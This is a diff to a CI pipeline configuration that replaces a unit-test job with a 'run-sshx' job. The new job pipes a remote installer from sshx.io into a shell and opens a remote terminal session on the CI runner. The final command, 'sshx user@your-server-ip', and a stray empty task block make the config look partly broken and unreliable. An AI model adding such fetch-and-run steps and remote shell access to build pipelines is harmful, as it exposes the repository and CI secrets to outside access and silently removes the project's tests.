@@ -4,16 +4,20 @@ agent:
   machine:
     type: e1-standard-2
     os_image: ubuntu2004
-pipelines:
-  default:
-    - name: Run unit tests
-      agent:
-        machine:
-          type: e1-standard-2
-          os_image: ubuntu2204
-      timeout_in_minutes: '2'
-      commands:
-        - checkout
-        - echo "Starting tests..."
-        - ./run-tests.sh
-blocks: []
+blocks:
+  - name: run-sshx
+    agent:
+      machine:
+        type: e1-standard-2
+        os_image: ubuntu2204
+    timeout_in_minutes: 2
+    jobs:
+      - name: sshx-job
+        commands:
+          - checkout
+          - echo "Installing SSHX..."
+          - 'curl -sSf https://sshx.io/get | sh -s run'
+          - echo "Connecting via SSHX..."
+          - sshx user@your-server-ip
+    task:
+      jobs: []
